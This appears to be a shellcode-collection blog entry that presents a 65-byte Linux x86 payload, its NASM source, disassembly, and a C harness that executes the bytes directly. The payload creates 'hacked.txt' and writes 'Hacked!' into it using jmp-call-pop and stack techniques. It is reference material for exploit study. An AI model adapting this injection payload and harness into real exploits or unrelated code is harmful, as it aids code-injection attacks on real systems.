---
title:  Linux/86 Create file -> Jmp-call-pop,Stack,XOR
date: 2022-06-03 05:49:33 +0800
categories: [Shellcodes, Linux]
tags: []  
---

# Info

Description: `Shellcode to create a file and write data into it.`

Platform: `Linux`

Arch: `x86`

Size: `65 bytes`

Technique: `jmp-call-pop`,`Stack`, `XOR`

Shellcode : `\xeb\x30\x5b\x31\xc0\x31\xc9\xb0\x08\x66\xb9\xff\x01\xcd\x80\x89\xc3\x31\xd2\x68\x65\x64\x21\x0a\x68\x48\x61\x63\x6b\x8d\x0c\x24\xb0\x04\xb2\x08\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xdb\xb0\x01\xcd\x80\xe8\xcb\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x2e\x74\x78\x74`

# Execution

![shellcode](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/shellcodes/creatfilexorjmpstack.png)

# Assembly-nasm

`nasm -f elf32 -o shellcode.o shellcode.asm`

`ld -o shellcode shellcode.o`

```nasm

global _start                                                                                                                                                     
                                                                                                                                                                  
section .text                                                                                                                                                                                                                                                                                                                         
_start:                                                                                                                                                               
    jmp data                                                                                                                                                          

main_:
    pop ebx

    ; create file
    xor eax, eax
    xor ecx, ecx
    mov al, 0x8
    mov cx, 0q777
    int 0x80

    ;write data
    mov ebx, eax
    xor edx, edx
  
    push 0xA216465
    push 0x6b636148
    lea ecx, [esp]
    
    mov al, 0x4
    mov dl, 0x8
    int 0x80

    ; close file
    xor eax, eax
    mov al, 0x6
    int 0x80
    
    ; exit      
    xor ebx, ebx
    mov al, 0x1
    int 0x80                             
                                         
data:         
    call main_               
    filename: db "hacked.txt"         

```
# objdump

`objdump -d ./shellcode -M intel`

```bash

./shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 30                   jmp    8048092 <data>

08048062 <main_>:
 8048062:       5b                      pop    ebx
 8048063:       31 c0                   xor    eax,eax
 8048065:       31 c9                   xor    ecx,ecx
 8048067:       b0 08                   mov    al,0x8
 8048069:       66 b9 ff 01             mov    cx,0x1ff
 804806d:       cd 80                   int    0x80
 804806f:       89 c3                   mov    ebx,eax
 8048071:       31 d2                   xor    edx,edx
 8048073:       68 65 64 21 0a          push   0xa216465
 8048078:       68 48 61 63 6b          push   0x6b636148
 804807d:       8d 0c 24                lea    ecx,[esp]
 8048080:       b0 04                   mov    al,0x4
 8048082:       b2 08                   mov    dl,0x8
 8048084:       cd 80                   int    0x80
 8048086:       31 c0                   xor    eax,eax
 8048088:       b0 06                   mov    al,0x6
 804808a:       cd 80                   int    0x80
 804808c:       31 db                   xor    ebx,ebx
 804808e:       b0 01                   mov    al,0x1
 8048090:       cd 80                   int    0x80

08048092 <data>:
 8048092:       e8 cb ff ff ff          call   8048062 <main_>

08048097 <filename>:
 8048097:       68 61 63 6b 65          push   0x656b6361
 804809c:       64 2e 74 78             fs cs je 8048118 <filename+0x81>
 80480a0:       74                      .byte 0x74

```

# C

`gcc -o shellcode shellcode.c`

```c

#include <string.h>
#include <stdio.h>

const char * shellcode = "\xeb\x30\x5b\x31\xc0\x31\xc9\xb0\x08\x66\xb9\xff\x01\xcd\x80\x89\xc3\x31\xd2\x68\x65\x64\x21\x0a\x68\x48\x61\x63\x6b\x8d\x0c\x24\xb0\x04\xb2\x08\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xdb\xb0\x01\xcd\x80\xe8\xcb\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x2e\x74\x78\x74";

int main(void){
        printf("Length: %d\n", strlen(shellcode));
        (*(void(*)())shellcode)();
        return 0;
}

```

